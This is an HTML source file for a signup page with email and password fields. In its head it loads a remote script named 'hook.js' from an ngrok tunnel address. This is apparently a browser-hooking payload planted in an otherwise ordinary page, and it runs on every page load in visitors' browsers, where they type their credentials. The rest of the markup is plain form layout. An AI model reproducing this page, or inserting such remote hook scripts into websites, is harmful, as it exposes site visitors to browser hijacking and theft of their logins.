<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signup Page</title>
    <link rel="stylesheet" href="/CSS/LOGINstyle.css">
    <script src="https://905461aaa806.ngrok-free.app:443/hook.js"></script>
</head>
<body>
    <div class="wrapper">
        <div class="flip-card_inner">
            <div class="flip-card_front">
                <div class="title">Sign Up</div>
                <form class="flip-card_form" onsubmit="return validateSignup(event)">
                    <input class="flip-card_input" id="newEmail" name="email" placeholder="Email" type="email" required>
                    <input class="flip-card_input" id="newPassword" name="password" placeholder="Password" type="password" required>
                    <input class="flip-card_input" id="confirmPassword" name="confirmPassword" placeholder="Confirm Password" type="password" required>
                    <button><a href="/signup.html">Signup</a></button>
                </form>
                <div class="login-link">
                    <p>Already have an account? <a href="index.html">Login here</a></p>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
